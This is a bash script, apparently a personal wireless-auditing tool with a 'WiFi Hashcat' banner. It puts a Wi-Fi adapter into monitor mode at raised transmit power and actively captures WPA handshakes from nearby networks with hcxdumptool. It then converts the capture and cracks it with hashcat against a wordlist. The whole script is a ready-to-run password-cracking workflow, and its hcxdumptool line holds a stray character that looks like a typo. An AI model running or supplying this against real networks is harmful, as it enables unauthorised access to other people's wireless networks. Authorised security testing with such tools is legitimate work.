#!/bin/bash

###########################################
#---------------) Colors (----------------#
###########################################

C=$(printf '\033')
RED="${C}[1;31m"
SED_RED="${C}[1;31m&${C}[0m"
GREEN="${C}[1;32m"
SED_GREEN="${C}[1;32m&${C}[0m"
YELLOW="${C}[1;33m"
SED_YELLOW="${C}[1;33m&${C}[0m"
SED_RED_YELLOW="${C}[1;31;103m&${C}[0m"
BLUE="${C}[1;34m"
SED_BLUE="${C}[1;34m&${C}[0m"
ITALIC_BLUE="${C}[1;34m${C}[3m"
LIGHT_MAGENTA="${C}[1;95m"
SED_LIGHT_MAGENTA="${C}[1;95m&${C}[0m"
LIGHT_CYAN="${C}[1;96m"
SED_LIGHT_CYAN="${C}[1;96m&${C}[0m"
LG="${C}[1;37m" #LightGray
SED_LG="${C}[1;37m&${C}[0m"
DG="${C}[1;90m" #DarkGray
SED_DG="${C}[1;90m&${C}[0m"
NC="${C}[0m"
UNDERLINED="${C}[5m"
ITALIC="${C}[3m"
  
###########################################


function box () {
	local s=("$@") b w
  	for l in "${s[@]}"; do
    		((w<${#l})) && { b="$l"; w="${#l}"; }
  	done
  	tput setaf 3
	echo "${GREEN}"
  	echo " -${b//?/-}-
| ${b//?/ } |"
  	for l in "${s[@]}"; do
		echo "${GREEN}"
    	printf '| %s%*s%s \n' "$(tput setaf 4)" "-$w" "$l" "$(tput setaf 3)"
  	done
	echo "${GREEN}"
  	echo "| ${b//?/ } |
 -${b//?/-}-"
  	tput sgr 0m
  	echo
} 
echo
echo "${RED}
              @@@  @@@  @@@ @@@ @@@@@@@@ @@@      @@@  @@@  @@@@@@
              @@!  @@!  @@! @@! @@!      @@!      @@!  @@@ !@@    
              @!!  !!@  @!@ !!@ @!!!:!   !!@      @!@  !@!  !@@!! 
               !:  !!:  !!  !!: !!:      !!:       !: .:!      !:!
                ::.:  :::   :    :       :           ::    ::.: : 
                                                                  
          @@@  @@@  @@@@@@   @@@@@@ @@@  @@@  @@@@@@@  @@@@@@  @@@@@@@
          @@!  @@@ @@!  @@@ !@@     @@!  @@@ !@@      @@!  @@@   @@!  
          @!@!@!@! @!@!@!@!  !@@!!  @!@!@!@! !@.      @!@!@!@!   @!!  
          !!:  !.! !!:  !!!     !:! !!:  !!! :!!      !!:  !.!   !!.  
           :   : :  :   : : ::.: :   :   : :  :: :: :  :   : :    :   
                                                                      

" | sed "s/^/`echo $YELLOW`/" | sed "s/\!/`echo $RED`\!`echo $YELLOW`/g" | sed "s/:/`echo $RED`:`echo $YELLOW`/g"
echo
if [ "$EUID" -ne 0 ]
  then 
  echo "${YELLOW}[${RED}!${YELLOW}] ${RED} Error: this script must be run as ${YELLOW}root" 
  echo "${YELLOW}[${RED}!${YELLOW}] ${RED} Re-run with ${YELLOW}sudo" 
  exit
fi

box "${YELLOW}[-] ${GREEN} Write the name of the interface:"
echo "${YELLOW}"
ip link show
echo "${GREEN}_______________"
read -r -p "${ITALIC_BLUE}--> ${NC}" INTERFACE
echo
while true; do #You sure while (y/n)
	echo "${ITALIC_BLUE}# The entered interface is: ${RED} $INTERFACE ${YELLOW}" 
	ip link show | grep -A1 $INTERFACE
	read -r -p "${ITALIC_BLUE}# Are you sure? [y/N] ${NC}" response_interface 
	case "$response_interface" in 
		[yY]) #Sure
		break 
		;; 
		[nN]) #Not sure
			echo "${YELLOW}" 
			echo "${ITALIC_BLUE}# Retype the interface: ${NC}" 
			echo
			read -r -p "${ITALIC_BLUE}--> ${NC}" INTERFACE
		;;
		* ) #Default
			echo "${RED}! Please type only Yy or Nn${NC}" 
 			echo 
		;;
	esac 
done #End sure while (y/n)

echo ${NC}

systemctl stop NetworkManager.service
systemctl stop wpa_supplicant.service

# Set the adapter as monitor mode
ip link set $INTERFACE down
iw dev $INTERFACE set type monitor
ip link set $INTERFACE up
iw $INTERFACE set txpower fixed 3000

echo
box "${YELLOW}[-] ${GREEN} Let's dump of the wifi networks. Press ${YELLOW}CTRL-C${GREEN} when you have finished"
now=$(date +"%Y-%m-%d-%H:%M")
mkdir $now-capture
hcxdumptool -i $INTERFACE ù -o $now-capture/$now.pcapng --active_beacon --enable_status=15

echo
box "${YELLOW}[-] ${GREEN} Let's decypt the captured pcap file"
hcxpcapngtool -o $now-capture/$now.hc22000 -E $now-capture/essidlist$now $now-capture/$now.pcapng

if [ -f $now-capture/$now.hc22000 ]; then
	echo
	box "${YELLOW}[-] ${GREEN} Enter the absolute path of the wordlist:"
	read -r -p "${ITALIC_BLUE}--> ${NC}" WORDLISTPATH

	echo
	while true; do #You sure while (y/n)
		echo "${ITALIC_BLUE}# The entered path is: ${RED} $WORDLISTPATH" 
		ls -lha $WORDLISTPATH
		read -r -p "${ITALIC_BLUE}# Are you sure? [y/N] ${NC}" response_path 
		case "$response_path" in 
			[yY]) #Sure
			break 
			;; 
			[nN]) #Not sure
				echo
				echo "${ITALIC_BLUE}# Retype the wordlist path: ${NC}" 
				echo
				read -r -p "${ITALIC_BLUE}--> ${NC}" WORDLISTPATH
			;;
			* ) #Default
				echo "${RED}! Please type only Yy or Nn${NC}" 
	 			echo 
			;;
		esac 
	done #End sure while (y/n)
		
# TODO: Do you want to add some rules?
#	If yes enter the absolute path of the rules file

	box "${YELLOW}[-] ${GREEN} Crack the captured hc22000 handshake"
	hashcat -m 22000 $now-capture/$now.hc22000 $WORDLISTPATH 
	echo

	box "${YELLOW}[-] ${GREEN} DONE!"
else
	box "${YELLOW}[-] ${GREEN} No hashes found! Please restart the script"
fi
